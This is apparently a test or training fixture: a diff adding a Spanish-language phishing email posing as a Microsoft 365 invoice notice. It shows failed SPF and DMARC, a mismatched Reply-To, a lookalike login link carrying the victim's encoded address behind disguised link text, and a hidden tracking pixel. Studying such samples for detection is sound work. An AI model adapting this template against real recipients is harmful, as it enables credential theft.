@@ -1,0 +1,48 @@
+Return-Path: <bounce-7731@proveedor-pagos.example>
+Received: from mx1.entidad.example (10.10.0.25) by exch01.entidad.local (10.10.0.40)
+ with Microsoft SMTP Server id 15.2.1544.9; Wed, 9 Sep 2026 08:12:41 +0000
+Received: from mail.proveedor-pagos.example (198.51.100.23) by mx1.entidad.example (10.10.0.25)
+ with ESMTP id 4Qx7Lm2vKz; Wed, 9 Sep 2026 08:12:39 +0000
+Authentication-Results: mx1.entidad.example; spf=fail smtp.mailfrom=proveedor-pagos.example;
+ dkim=none; dmarc=fail action=none header.from=proveedor-pagos.example
+From: "Microsoft 365 Facturacion" <facturacion@proveedor-pagos.example>
+Reply-To: soporte-cobros@correo-rapido.example
+To: finanzas03@entidad.example
+Subject: Factura pendiente septiembre - accion requerida
+Date: Wed, 9 Sep 2026 08:12:30 +0000
+Message-ID: <20260909081230.7731@proveedor-pagos.example>
+X-Mailer: PHPMailer 6.8.1
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="=_fact_0909"
+
+--=_fact_0909
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+Estimado cliente:
+
+Tiene una factura pendiente correspondiente al mes de septiembre por importe de 1.482,60 EUR.
+Para evitar la suspensión del servicio, revise el documento antes de las 18:00 de hoy:
+
+https://login-microsoft365.secure-docs.example/auth/factura?d=ZmluYW56YXMwM0BlbnRpZGFkLmV4YW1wbGU=
+
+Atentamente,
+Departamento de Facturación
+
+--=_fact_0909
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OlNlZ29lIFVJLEFyaWFsLHNhbnMtc2VyaWYi
+Pgo8cD5Fc3RpbWFkbyBjbGllbnRlOjwvcD4KPHA+VGllbmUgdW5hIGZhY3R1cmEgcGVuZGllbnRl
+IGNvcnJlc3BvbmRpZW50ZSBhbCBtZXMgZGUgc2VwdGllbWJyZSBwb3IgaW1wb3J0ZSBkZSAxLjQ4
+Miw2MCBFVVIuClBhcmEgZXZpdGFyIGxhIHN1c3BlbnNpw7NuIGRlbCBzZXJ2aWNpbywgcmV2aXNl
+IGVsIGRvY3VtZW50byBhbnRlcyBkZSBsYXMgMTg6MDAgZGUgaG95LjwvcD4KPHA+PGEgaHJlZj0i
+aHR0cHM6Ly9sb2dpbi1taWNyb3NvZnQzNjUuc2VjdXJlLWRvY3MuZXhhbXBsZS9hdXRoL2ZhY3R1
+cmE/ZD1abWx1WVc1NllYTXdNMEJsYm5ScFpHRmtMbVY0WVcxd2JHVT0iPmh0dHBzOi8vcG9ydGFs
+Lm9mZmljZS5leGFtcGxlL2ZhY3R1cmFzLzIwMjYtMDk8L2E+PC9wPgo8cD5BdGVudGFtZW50ZSw8
+YnI+RGVwYXJ0YW1lbnRvIGRlIEZhY3R1cmFjacOzbjwvcD4KPGltZyBzcmM9Imh0dHBzOi8vaW1n
+LnNlY3VyZS1kb2NzLmV4YW1wbGUvdC5naWY/aWQ9ODg0MSIgd2lkdGg9IjEiIGhlaWdodD0iMSI+
+CjwvYm9keT48L2h0bWw+
+
+--=_fact_0909--
